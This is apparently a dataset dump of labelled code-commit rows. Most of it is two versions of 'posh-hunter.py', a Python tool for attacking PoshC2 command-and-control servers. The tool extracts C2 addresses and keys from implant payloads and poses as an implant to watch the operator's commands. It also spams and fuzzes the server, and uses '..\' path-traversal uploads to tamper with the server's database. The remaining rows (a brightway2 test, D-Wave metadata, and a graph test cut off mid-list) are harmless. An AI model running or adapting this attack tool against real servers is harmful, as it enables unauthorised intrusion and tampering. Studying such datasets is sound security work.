    imagebytes = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACAUlEQVR42rWXi7WCMAyG2xGcRUfQEXAE7wgyAq7gCDqCjiCruAK3f2162pDSlkfOQaRA8+VPH0Grehvw03WdvXi/3/Y4Ho/+Gv9xtG2rc51lH+DOjanT6eSd4RpGba/Xy55vtxsAsj5qAKxzrbV3ajvQvy5IETiV7kMRAzzyNwuA5OYqhE6pDUrgGSgDlTiECGCiGSi3rN1G+HGdt78OI6AUFKWJj40IwNwcSK7r9Rq9TJFwKFgI1JlIDyxNHCJUIQSI3kC0HIIbYPq+H4GRcy2AuDERAyByKbISiJSFuZ8EQL7ddBEtJWXOdCINI4BU9EtVKAZQLPfcMCC5jCXGFybJ+aYABMHUFReizQAiR0L0tmGrMVAMMDULaEHiK92qAO4spgHSr+G8BCCCWDPyGgALsWbUcwD8TgibGpykVOkMkbZiEWDChtEm83dQ+t5nl2tpG14MUKMCnne1xDIAGhvcIXY+bMuPxyMJkPJVCmBD/5jj7g5uTdMkX34+n/NqQlqkQukv7t5F1VlbC0DlGZcbAwptkB1WOmNS/lIAQziyQ6dQpHR/OJ/Par/f+2epok7VhKJzihSd2OlnBoI+zK+UCIR8j1bC7/erdrvdKHqCqVGgBMIDSDkPo59rmAHSDKGiNdqMuKxh9HMs9z5U8Ntx6ktmSTkmfeCIALmqaEv7B/CgdPivPO+zAAAAAElFTkSuQmCC')     
    maxbyteslen = 1500
    maxdatalen = 1500 + len( data )
    imagebyteslen = len(imagebytes)
    paddingbyteslen = maxbyteslen - imagebyteslen
    bytepadding = '.'.ljust(paddingbyteslen,'.')
    imagebytesfull = imagebytes + bytepadding + data
    return imagebytesfull

  def uploadfile( self, localpath, remotepath, data=None ):
    c = 'download-file '+remotepath
    self.setcookie(c)
    if data:
      filedata = data
    else:
      with open( localpath, 'rb' ) as f:
        filedata = f.read()

  #         $bufferSize = 10737418;
  #             $preNumbers = ($ChunkedByte+$totalChunkByte)
  #             $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)
    buffersize = 10737418
    filesize = len( filedata )
    chunksize = filesize / buffersize
    import math
    totalchunks = int(math.ceil(chunksize))
    if totalchunks < 1: totalchunks = 1
    totalchunkstr = str( totalchunks ).rjust(5,'0')
    chunk = 1
    start = 0
    while chunk <= totalchunks:
      chunkstr = str( chunk ).rjust(5,'0')
      prenumbers=chunkstr + totalchunkstr
      chunkdata = filedata[start:start+buffersize]
      chunk+=1
      start += buffersize
      send = self.encrypt( prenumbers + chunkdata, gzip=True )
      uploadbytes = self.getimgdata( send )
      print 'Chunk data: ' + chunkdata
      print 'Prenumbers: ' + prenumbers
      print 'Imgdata: ' + uploadbytes
      response = self.do_request( self.commsurl, uploadbytes )
      # print response
      if len(response.strip()) > 0:
        print self.decrypt( response )
    return False  

  def wipedb( self ):
    print 'Wiping their DB...'
    self.uploadfile( None, '..\PowershellC2.SQLite', 'Appended data' )
    self.uploadfile( None, '..\oops.txt', 'oopsy' )
    self.uploadfile( None, '..\Restart-C2Server.lnk', 'oopsy' )

  # Listen to incoming commands
  def listen( self, url ):
    print 'Listening to server on comms URL: ' + url
    fmt = '%Y-%m-%d %H:%M:%S'
    while True:
      self.setcookie( '' )
      data = self.do_request( url )
      if len( data.strip() ) > 0:
        try:
          cmd = self.decrypt( data )
        except:
          print 'Decrypting response failed: ' + data
        out = ''
        if 'fvdsghfdsyyh' in cmd:
          out = 'No command...'
        elif '!d-3dion@LD!-d' in cmd:
          out = '\n'.join(cmd.split('!d-3dion@LD!-d'))
        else: 
          out = cmd
      else:
        out = 'No command...'

      print datetime.datetime.now().strftime(fmt) + ': ' + out
      time.sleep( self.sleeptime )
    return False

  # rickroll the server
  def rickroll( self, url ):
    thisdir = os.path.dirname(os.path.realpath(__file__))
    wordsfile = thisdir + '/nevergonna.txt'
    self.username = 'rastley'
    self.domain = 'SAW'
    self.host = 'https://bitly.com/98K8eH'
    self.spam( wordsfile, url )
 
  # Spray the contents of a txt file at the server as machine names
  def spam( self, wordsfile, url ):
    try:
      with open( wordsfile, 'r' ) as f:
        lines = f.readlines()
    except:
      print 'Failed to open ' + wordsfile
      return False

    for line in lines:
      line = line.strip() # re.sub( '[^-0-9a-zA-Z ]', '', line.strip() ).replace(' ','-')
      self.machine = line
      key = self.key
      self.secondstage( url )
      self.pid = None
      self.key = key
    return True
  
  # Connect with random keys, forever
  def fuzz( self, secondstage ):
    import random
    while True:
      c = b''
      for i in range( 0, 16 ):
        c += unichr( random.randint(0, 127 ) )
      self.key = base64.b64encode( c )
      self.secondstage( secondstage )

        

def main():
  
  # Command line options
  parser = argparse.ArgumentParser(description=""Find, monitor and troll a PoshC2 server"")
  parser.add_argument(""-a"", ""--analyse"", help=""Analyse an implant payload to discover C2 server"")
  parser.add_argument(""-k"", ""--key"", help=""Comms encryption key"" )
  parser.add_argument(""-U"", ""--useragent"", help=""User-agent string"" )
  parser.add_argument(""-r"", ""--referer"", help=""Referer string"" )
  parser.add_argument(""-H"", ""--host"", help=""Host name to connect to"" )
  parser.add_argument(""-g"", ""--hostheader"", help=""Host header for domain fronted servers"")
  parser.add_argument(""-d"", ""--domain"", default='WORKGROUP', help=""Windows domain name to claim to be in"")
  parser.add_argument(""-u"", ""--user"", default='user', help=""Windows user to claim to be connecting as"")
  parser.add_argument(""-m"", ""--machine"", default='DESKTOP', help=""Machine hostname to claim to be connecting as"")
  parser.add_argument(""--connect"", action='store_true', help=""Connect to the C2 as a new implant then quit"")
  parser.add_argument(""--watch"", action='store_true', help=""Connect and monitor commands as they come in"")

  parser.add_argument(""--spam"", metavar=""TEXTFILE"", help=""Spam the connected implants screen with content from this text file"")
  parser.add_argument(""--rickroll"", action='store_true', help=""Spam with the entire lyrics to Never Gonna Give You Up"")
  parser.add_argument(""--upload"", nargs=2, help=""Upload a file to the C2 server (NOTE: this writes data from the local file to the remote file in APPEND mode)"")
  parser.add_argument(""--fuzz"", action='store_true', help=""Fuzz with random bytes"")
  if len( sys.argv)==1:
    parser.print_help()
    sys.exit(1)
  args = parser.parse_args()

  if args.analyse:
    payload = PoshC2Payload( args.analyse )   
    c2 = payload.analyse()
    secondstage = payload.secondstage
  else:
    c2 = PoshC2Server()
    c2.useragent = args.useragent
    c2.referer = args.referer
    c2.key = args.key
    c2.host = args.host
  c2.domain = args.domain
  c2.username = args.user
  c2.machine = args.machine

  if args.connect:
    c2.secondstage( secondstage )
    return True

  if args.watch:
    c2.secondstage( secondstage, interact=True )
    return True

  if args.rickroll:
    c2.rickroll( payload.secondstage )
    return True

  if args.upload:
    c2.secondstage( secondstage )
    c2.uploadfile( args.upload[0], args.upload[1] ) 

  if args.fuzz:
    c2.fuzz( secondstage )

if __name__ == ""__main__"":
  main()
/n/n/n",0
181,181,e523c6418720a20eb247111d21424752f6994ee0,"/posh-hunter.py/n/n#!/usr/bin/env python
# Find, monitor and troll a PoshC2 server

import zlib, argparse, os, sys, re, requests, subprocess, datetime, time, base64

class PoshC2Payload:
  
  filepath = None
  useragent = None
  secondstage = None
  encryptionkey = None

  def __init__( self, path ):
    if not os.path.isfile( path ):
      print path + ' isn\'t a file'

    self.filepath = path

  # Attempt to pull info out of implant payload
  def analyse( self ):
    print 'Analysing ' + self.filepath + '...'

    with open( self.filepath, 'rb' ) as f:
      decoded = PoshC2Payload.base64_walk( f.read() )
  
    # print decoded

    # Get custom headers
    headernames = [
      'User-Agent',
      'Host',
      'Referer'
    ]
    self.headers = {}
    for h in headernames:
      m = re.search( h + '"",""([^""]*)""', decoded, re.IGNORECASE )
      if m:
        print h + ': ' + m.group(1)
        self.headers[h] = m.group(1)

    # Get host header
    m = re.search('\$h=""([^""]*)""', decoded )
    if m:
      self.headers['Host'] = m.group(1)
      print 'Host header: ' + m.group(1)

    # Get second stage URL
    m = re.search('\$s=""([^""]*)""', decoded )
    if m:
      self.secondstage = m.group(1)
      print 'Second stage URL: ' + self.secondstage
    
    # Get encryption key
    m = re.search('-key ([/+a-z0-9A-Z]*=*)', decoded )
    if m:
      self.encryptionkey = m.group(1)
      print 'Encryption key: ' + self.encryptionkey

    c2 = PoshC2Server()
    c2.key = self.encryptionkey
    return c2

  # Recursively attempt to extract and decode base64
  @staticmethod
  def base64_walk( data ):

    # data = data.decode('utf-16le').encode('utf-8')

    # Convert by stripping zero bytes, lol
    s = ''
    for c in data:
      if ord( c ) != 0:
        s += c
    data = s
    # print ''
    # print 'Attempting to get data from: ' + data

    # Find all base64 strings
    m = re.findall( r'[+/0-9a-zA-Z]{20,}=*', data )
    
    if len( m ) == 0:
      print 'No more base64 found'
      return data

    # Join into one string
    b64 = ''.join(m)
    # print 'Found: ' + b64
    
    decoded = base64.b64decode( b64 )

    # Deflated?
    decompress = zlib.decompressobj(
      -zlib.MAX_WBITS  # see above
    )
    try:
      d = decompress.decompress( decoded )
      if d:
        print 'Data is compressed'
        decoded = d
    except:
      print 'Data is not compressed'

    # Check if the data now contains a user agent, URL 
    m = re.search(r'user-agent',decoded,re.IGNORECASE)
    if m:
      return decoded
    
    return PoshC2Payload.base64_walk( decoded )


class PoshC2Server:

  host = None
  hostheader = None
  key = None
  useragent = None
  referer = None
  cookie = None
  pid = None
  username = None
  domain = None
  cookies = None
  debug = False
  sleeptime = 5

  def __init__( self, host=None, hostheader=None ):
    
    self.session = requests.Session()
    self.host = host
    if not hostheader:
      self.hostheader = host
    else:
      self.hostheader = hostheader

  def do_request( self, url, data=None ):
    
    # def do_request( self, path, method='GET', data=None, files=None, returnformat='json', savefile=None ):
    headers = {
      'Host': self.hostheader,
      'Referer': self.referer,
      'User-Agent': self.useragent,
      'Cookie': self.cookie
    }
    if len(self.session.cookies) > 0:
      cookies = requests.utils.dict_from_cookiejar(self.session.cookies)
      cookies['SessionID'] = self.cookie
      print 'Including cookies'
      print self.cookie

    try:
      if data:
        response = self.session.post(url, data=data, headers=headers, verify=False ) # , files=files, stream=stream )
      else:
        response = self.session.get(url, headers=headers, verify=False )
    except:
      e = sys.exc_info()[1]
      print 'Request failed: ' + str( e ), 'fail' 
      return False

    if self.debug: 
      print response
      print response.text   
    if response.status_code == 200:
      return response.text
    self.error = response
    if self.debug:
      print self.error
    return False

  def get_encryption( self, iv='0123456789ABCDEF' ):
    from Crypto.Cipher import AES
    aes = AES.new( base64.b64decode(self.key), AES.MODE_CBC, iv )
    return aes

  # Encrypt a string and base64 encode it
  def encrypt( self, data, gzip=False ):
    # function ENC ($key,$un){
    # $b = [System.Text.Encoding]::UTF8.GetBytes($un)
    # $a = CAM $key
    # $e = $a.CreateEncryptor()
    # $f = $e.TransformFinalBlock($b, 0, $b.Length)
    # [byte[]] $p = $a.IV + $f
    # [System.Convert]::ToBase64String($p)
    # }

    if gzip:
      print 'Gzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      out = StringIO.StringIO()
      with gzip.GzipFile(fileobj=out, mode=""w"") as f:
        f.write(data)
      data = out.getvalue() 

    # Pad with zeros
    mod = len(data) % 16
    if mod != 0:
      newlen = len(data) + (16-mod)
      data = data.ljust( newlen, '\0' )
    aes = self.get_encryption()
    # print 'Data len: ' + str(len(data))
    data = aes.IV + aes.encrypt( data )
    if not gzip:
      data = base64.b64encode( data )
    return data

  # Decrypt a string from base64 encoding 
  def decrypt( self, data, gzip=False ):
    # iv is first 16 bytes of cipher
    iv = data[0:16]
    # data = data[16:]
    # print 'IV length: ' + str(len(iv))
    aes = self.get_encryption(iv)
    if not gzip:
      data = base64.b64decode(data)
    data =  aes.decrypt( data )
    if gzip:
      print 'Gunzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      infile = StringIO.StringIO(data)
      with gzip.GzipFile(fileobj=infile, mode=""r"") as f:
        data = f.read()
    return data[16:]
  
  def setcookie( self, value=None ):
    if value:
      c = value
    else:
    # $o=""$env:userdomain\$u;$u  ;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;http://172.16.88.221""
      if not self.pid:
        import random
        self.pid = random.randrange(300,9999)
      c = self.domain + '\\'
      c += self.username + ';'
      c += self.username + ';' 
      c += self.machine + ';AMD64;' 
      c += str( self.pid ) + ';' 
      c += self.host
    print c
    self.cookie = 'SessionId=' + self.encrypt( c )
    print self.cookie

  # Get the second stage
  def secondstage( self, url, interact=False ):
    
    # $o=""$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://172.16.88.221""
    # $pp=enc -key sBOGMbI+wTzxiN9H8q8y8YFBuD/KGsmvCnwRhDjPVXE= -un $o
    # $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
    self.host = '/'.join(url.split('/')[0:3])
    self.setcookie()
    data = self.do_request( url )
    data = self.decrypt( data )

    # print data

    # Get encryption key, URL
    m = re.search( r'\$key *= *""([^""]+)""', data )
    if m:
      print 'Comms encryption key: ' + m.group(1)
      self.key = m.group(1)
    m = re.search(r'\$Server *= *""([^""]+)""', data )
    if m:
      print 'Comms URL: ' + m.group(1)
      self.commsurl = m.group(1)
    m = re.search(r'\$sleeptime *= *([0-9]+)', data )
    if m:
      print 'Sleep time: ' + m.group(1)
      self.sleeptime = int(m.group(1))

    if not interact: return True
    
    self.listen( self.commsurl )

  def getimgdata( self, data ):
    # Just use one image because we don't care
    imagebytes = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACAUlEQVR42rWXi7WCMAyG2xGcRUfQEXAE7wgyAq7gCDqCjiCruAK3f2162pDSlkfOQaRA8+VPH0Grehvw03WdvXi/3/Y4Ho/+Gv9xtG2rc51lH+DOjanT6eSd4RpGba/Xy55vtxsAsj5qAKxzrbV3ajvQvy5IETiV7kMRAzzyNwuA5OYqhE6pDUrgGSgDlTiECGCiGSi3rN1G+HGdt78OI6AUFKWJj40IwNwcSK7r9Rq9TJFwKFgI1JlIDyxNHCJUIQSI3kC0HIIbYPq+H4GRcy2AuDERAyByKbISiJSFuZ8EQL7ddBEtJWXOdCINI4BU9EtVKAZQLPfcMCC5jCXGFybJ+aYABMHUFReizQAiR0L0tmGrMVAMMDULaEHiK92qAO4spgHSr+G8BCCCWDPyGgALsWbUcwD8TgibGpykVOkMkbZiEWDChtEm83dQ+t5nl2tpG14MUKMCnne1xDIAGhvcIXY+bMuPxyMJkPJVCmBD/5jj7g5uTdMkX34+n/NqQlqkQukv7t5F1VlbC0DlGZcbAwptkB1WOmNS/lIAQziyQ6dQpHR/OJ/Par/f+2epok7VhKJzihSd2OlnBoI+zK+UCIR8j1bC7/erdrvdKHqCqVGgBMIDSDkPo59rmAHSDKGiNdqMuKxh9HMs9z5U8Ntx6ktmSTkmfeCIALmqaEv7B/CgdPivPO+zAAAAAElFTkSuQmCC')     
    maxbyteslen = 1500
    maxdatalen = 1500 + len( data )
    imagebyteslen = len(imagebytes)
    paddingbyteslen = maxbyteslen - imagebyteslen
    bytepadding = '.'.ljust(paddingbyteslen,'.')
    imagebytesfull = imagebytes + bytepadding + data
    return imagebytesfull

  def uploadfile( self, localpath, remotepath, data=None ):
    c = 'download-file '+remotepath
    self.setcookie(c)
    if data:
      filedata = data
    else:
      with open( localpath, 'rb' ) as f:
        filedata = f.read()

  #         $bufferSize = 10737418;
  #             $preNumbers = ($ChunkedByte+$totalChunkByte)
  #             $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)
    buffersize = 10737418
    filesize = len( filedata )
    chunksize = filesize / buffersize
    import math
    totalchunks = int(math.ceil(chunksize))
    if totalchunks < 1: totalchunks = 1
    totalchunkstr = str( totalchunks ).rjust(5,'0')
    chunk = 1
    start = 0
    while chunk <= totalchunks:
      chunkstr = str( chunk ).rjust(5,'0')
      prenumbers=chunkstr + totalchunkstr
      chunkdata = filedata[start:start+buffersize]
      chunk+=1
      start += buffersize
      send = self.encrypt( prenumbers + chunkdata, gzip=True )
      uploadbytes = self.getimgdata( send )
      print 'Chunk data: ' + chunkdata
      print 'Prenumbers: ' + prenumbers
      print 'Imgdata: ' + uploadbytes
      response = self.do_request( self.commsurl, uploadbytes )
      print response
      if len(response.strip()) > 0:
        print self.decrypt( response )
    return False  

  def wipedb( self ):
    print 'Wiping their DB...'
    self.uploadfile( None, '..\PowershellC2.SQLite', 'Appended data' )
    self.uploadfile( None, '..\oops.txt', 'oopsy' )
    self.uploadfile( None, '..\Restart-C2Server.lnk', 'oopsy' )

  # Listen to incoming commands
  def listen( self, url ):
    print 'Listening to server on comms URL: ' + url
    fmt = '%Y-%m-%d %H:%M:%S'
    while True:
      data = self.do_request( url )
      cmd = self.decrypt( data )
      out = ''
      if 'fvdsghfdsyyh' in cmd:
        out = 'No command...'
      elif '!d-3dion@LD!-d' in cmd:
        out = '\n'.join(cmd.split('!d-3dion@LD!-d'))
      else: 
        out = cmd

      print datetime.datetime.now().strftime(fmt) + ': ' + out
      time.sleep( self.sleeptime )
    return False

  # rickroll the server
  def rickroll( self, url ):
    thisdir = os.path.dirname(os.path.realpath(__file__))
    wordsfile = thisdir + '/nevergonna.txt'
    self.username = 'rastley'
    self.domain = 'SAW'
    self.host = 'https://bitly.com/98K8eH'
    self.spam( wordsfile, url )
 
  # Spray the contents of a txt file at the server as machine names
  def spam( self, wordsfile, url ):
    try:
      with open( wordsfile, 'r' ) as f:
        lines = f.readlines()
    except:
      print 'Failed to open ' + wordsfile
      return False

    for line in lines:
      line = line.strip() # re.sub( '[^-0-9a-zA-Z ]', '', line.strip() ).replace(' ','-')
      self.machine = line
      key = self.key
      self.secondstage( url )
      self.pid = None
      self.key = key
    return True
  
  # Connect with random keys, forever
  def fuzz( self, secondstage ):
    import random
    while True:
      c = b''
      for i in range( 0, 16 ):
        c += unichr( random.randint(0, 127 ) )
      self.key = base64.b64encode( c )
      self.secondstage( secondstage )

        

def main():
  
  # Command line options
  parser = argparse.ArgumentParser(description=""Find, monitor and troll a PoshC2 server"")
  parser.add_argument(""-a"", ""--analyse"", help=""Analyse an implant payload to discover C2 server"")
  parser.add_argument(""-k"", ""--key"", help=""Comms encryption key"" )
  parser.add_argument(""-U"", ""--useragent"", help=""User-agent string"" )
  parser.add_argument(""-r"", ""--referer"", help=""Referer string"" )
  parser.add_argument(""-H"", ""--host"", help=""Host name to connect to"" )
  parser.add_argument(""-g"", ""--hostheader"", help=""Host header for domain fronted servers"")
  parser.add_argument(""-d"", ""--domain"", default='WORKGROUP', help=""Windows domain name to claim to be in"")
  parser.add_argument(""-u"", ""--user"", default='user', help=""Windows user to claim to be connecting as"")
  parser.add_argument(""-m"", ""--machine"", default='DESKTOP', help=""Machine hostname to claim to be connecting as"")
  parser.add_argument(""--connect"", action='store_true', help=""Connect to the C2 as a new implant then quit"")
  parser.add_argument(""--watch"", action='store_true', help=""Connect and monitor commands as they come in"")

  parser.add_argument(""--spam"", metavar=""TEXTFILE"", help=""Spam the connected implants screen with content from this text file"")
  parser.add_argument(""--rickroll"", action='store_true', help=""Spam with the entire lyrics to Never Gonna Give You Up"")
  parser.add_argument(""--upload"", nargs=2, help=""Upload a file to the C2 server (NOTE: this writes data from the local file to the remote file in APPEND mode)"")
  parser.add_argument(""--fuzz"", action='store_true', help=""Fuzz with random bytes"")
  if len( sys.argv)==1:
    parser.print_help()
    sys.exit(1)
  args = parser.parse_args()

  if args.analyse:
    payload = PoshC2Payload( args.analyse )   
    c2 = payload.analyse()
    secondstage = payload.secondstage
  else:
    c2 = PoshC2Server()
    c2.useragent = args.useragent
    c2.referer = args.referer
    c2.key = args.key
    c2.host = args.host
  c2.domain = args.domain
  c2.username = args.user
  c2.machine = args.machine

  if args.connect:
    c2.secondstage( secondstage )
    return True

  if args.watch:
    c2.secondstage( secondstage, interact=True )
    return True

  if args.rickroll:
    c2.rickroll( payload.secondstage )
    return True

  if args.upload:
    c2.secondstage( secondstage )
    c2.uploadfile( args.upload[0], args.upload[1] ) 

  if args.fuzz:
    c2.fuzz( secondstage )

if __name__ == ""__main__"":
  main()
/n/n/n",1
64,64,656f459e53a177aeabfb96f00e6b8f4a28f87c98,"tests/test_bw2_disclosure.py/n/nimport os
import brightway2 as bw2
from fixtures import *

from lca_disclosures.brightway2.disclosure import Bw2Disclosure as DisclosureExporter
from lca_disclosures.brightway2.importer import DisclosureImporter

def test_attributes():

    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    assert de.foreground_flows
    assert de.background_flows
    assert de.emission_flows
    assert de.Af
    assert de.Ad
    assert de.Bf
    assert de.cutoffs


def test_bw2_disclosure():
    
    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    disclosure_file = de.write_json()

    print (os.path.realpath(disclosure_file))

    assert os.path.isfile(disclosure_file)

    bw2.projects.set_current(IMPORT_PROJECT_NAME)

    di = DisclosureImporter(disclosure_file)

    di.apply_strategies()

    assert di.statistics()[2] == 0

    di.write_database()

    assert len(bw2.Database(di.db_name)) != 0
/n/n/n",0
65,65,656f459e53a177aeabfb96f00e6b8f4a28f87c98,"/tests/test_bw2_disclosure.py/n/nimport os
import brightway2 as bw2
from fixtures import *

from lca_disclosures.brightway2.disclosure import Bw2Disclosure as DisclosureExporter
from lca_disclosures.brightway2.importer import DisclosureImporter

def test_attributes():

    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    assert de.foreground_flows
    assert de.background_flows
    assert de.emission_flows
    assert de.Af
    assert de.Ad
    assert de.Bf
    assert de.cutoffs


def test_bw2_disclosure():
    
    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    disclosure_file = de.write_json()

    print (disclosure_file)

    assert os.path.isfile(disclosure_file)

def test_bw2_import():

    bw2.projects.set_current(IMPORT_PROJECT_NAME)

    di = DisclosureImporter(os.path.join(os.path.dirname(os.path.realpath(__file__)), TEST_FOLDER, ""{}.json"".format(TEST_FILENAME)))

    di.apply_strategies()

    assert di.statistics()[2] == 0

    di.write_database()

    assert len(bw2.Database(di.db_name)) != 0
/n/n/n",1
42,42,31ab237dacb201a31b16de76ffd7449873cb18d8,"hybrid/package_info.py/n/n# Copyright 2018 D-Wave Systems Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

__packagename__ = 'dwave-hybrid'
__title__ = 'D-Wave Hybrid'
__version__ = '0.2.0'
__author__ = 'D-Wave Systems Inc.'
__authoremail__ = 'radomir@dwavesys.com'
__description__ = 'Hybrid Asynchronous Decomposition Solver Framework'
__url__ = 'https://github.com/dwavesystems/dwave-hybrid'
__license__ = 'Apache 2.0'
__copyright__ = '2018, D-Wave Systems Inc.'
/n/n/n",0
43,43,31ab237dacb201a31b16de76ffd7449873cb18d8,"/hybrid/package_info.py/n/n# Copyright 2018 D-Wave Systems Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

__packagename__ = 'dwave-hybrid'
__title__ = 'D-Wave Hybrid'
__version__ = '0.1.4'
__author__ = 'D-Wave Systems Inc.'
__authoremail__ = 'radomir@dwavesys.com'
__description__ = 'Hybrid Asynchronous Decomposition Solver Framework'
__url__ = 'https://github.com/dwavesystems/dwave-hybrid'
__license__ = 'Apache 2.0'
__copyright__ = '2018, D-Wave Systems Inc.'
/n/n/n",1
88,88,b0214dec06089bd9f45b028f3b69ed5dc29df204,"tests/graph_test.py/n/nimport unittest
from src.graph import *


test_offers = [{
  'offers': [
    {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
  ],
  'want': 'Chaos',
  'have': 'Alteration',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
    {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
  ],
  'want': 'Chaos',
  'have': 'Chromatic',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
    {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
  ],
  'want': 'Alteration',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
    {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
  ],
    'want': 'Alteration',
    'have': 'Chromatic',
    'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
    {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
  ],
  'want': 'Chromatic',
  'have': 'Chaos',
  'league': 'Abyss'
}, {
  'offers': [
    {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
    {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
  ],
  'want': 'Chromatic',
  'have': 'Alteration',
  'league': 'Abyss'
}]

expected_graph = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 24},
      {'contact_ign': 'Corailthedog', 'conversion_rate': 11.0, 'stock': 2}
    ],
    'Chromatic': [
      {'contact_ign': 'The_Dank_Fire_God', 'conversion_rate': 11.5, 'stock': 106},
      {'contact_ign': 'MinerinoAbysss', 'conversion_rate': 11.1, 'stock': 322}
    ]
  },
  'Alteration': {
    'Chaos': [
      {'contact_ign': 'KnifeySpooneyClaw', 'conversion_rate': 0.0893, 'stock': 153}
    ],
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 10},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 20}
    ],
    'Alteration': [
      {'contact_ign': 'Azure_Dragon', 'conversion_rate': 1.0101, 'stock': 4261},
      {'contact_ign': 'Marcvz_GreenAgain', 'conversion_rate': 0.7143, 'stock': 222}
    ]
  }
}



### Below structures are modified for simpler testing => number reduced, offers slightly changed


# Exptected graph when trading from Chaos to Chaos over one other currency
expected_graph_small = {
  'Chaos': {
    'Alteration': [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100}
    ]
  },
  'Alteration': {
    'Chromatic': [
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576}
    ]
  },
  'Chromatic': {
    'Chaos': [
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200}
    ]
  }
}

# Expected paths from Chaos to Chaos
def expected_paths_small_same_currency():
  return [
    [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Shioua_ouah', 'conversion_rate': 0.6897, 'stock': 1576, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': 'MVP_Kefir', 'conversion_rate': 0.087, 'stock': 200, 'have': 'Chromatic', 'want': 'Chaos'}
    ], [
      {'contact_ign': 'wreddnuy', 'conversion_rate': 12.0, 'stock': 100, 'have': 'Chaos', 'want': 'Alteration'},
      {'contact_ign': 'Ashkeri', 'conversion_rate': 0.7143, 'stock': 449, 'have': 'Alteration', 'want': 'Chromatic'},
      {'contact_ign': '_ZEUS___', 'conversion_rate': 0.0909, 'stock': 100, 'have': 'Chromatic', 'want': 'Chaos'}
    ]
  ]

def expected_profitable_paths_small_same_currency():
  return []


# Expected paths from Chaos to Chromatics
# This is not really relevant to us, since we only care about trade paths between the same currency in order to
# guarantee easily comparable results. However, it's good to make sure that the path exploration also works for this
# edge case
expected_profitable_paths_small_different_currency = [
  [
